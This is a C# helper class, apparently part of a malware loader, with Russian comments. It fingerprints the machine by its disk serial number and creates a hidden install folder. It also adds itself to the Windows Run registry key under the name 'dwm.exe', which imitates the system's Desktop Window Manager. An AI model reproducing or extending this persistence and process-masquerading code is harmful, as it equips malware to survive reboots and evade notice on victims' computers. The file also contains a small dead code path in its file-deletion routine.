using Microsoft.Win32;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace dwm
{
    class Helper
    {
        

        public static string GetHWID()
        {
            string str = "";
            {
                try
                {
                    string str2 = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                    ManagementObject obj1 = new ManagementObject("win32_logicaldisk.deviceid=\"" + str2 + ":\"");
                    obj1.Get();
                    str = obj1["VolumeSerialNumber"].ToString();
                }
                catch (Exception)
                {
                }
            }
            return str;
        }

        public static string RND() // рандомные символы
        {
            var rnd = new Random();
            var s = new StringBuilder();

            for (int i = 0; i < 10; i++)
                s.Append((char)rnd.Next('a', 'z'));

            var strt = s.ToString();
            return strt;
        }        

        public static void RootDirC() // проверка и создание папки под инсталлы
        {

            if (System.IO.Directory.Exists(MyString.rootdir))
            {

            }
            else
            {
                DirectoryInfo di = Directory.CreateDirectory(MyString.rootdir);
            }

        }

        public static void AutoRun() // автозапуск
        {
            const string name = "dwm.exe";

            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");                          
            reg.SetValue(name, ExePath);                
            reg.Close();
            
        }

        public static void FDel() // удаление файла, если такой есть
        {
            string fname = RND() + ".exe";
            string put = MyString.rootdir + ".exe";

            if (System.IO.File.Exists(put))
            {
               System.IO.File.Delete(put);               
            }
            else { }
        }

        public static void Hcon()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        }

    }
}
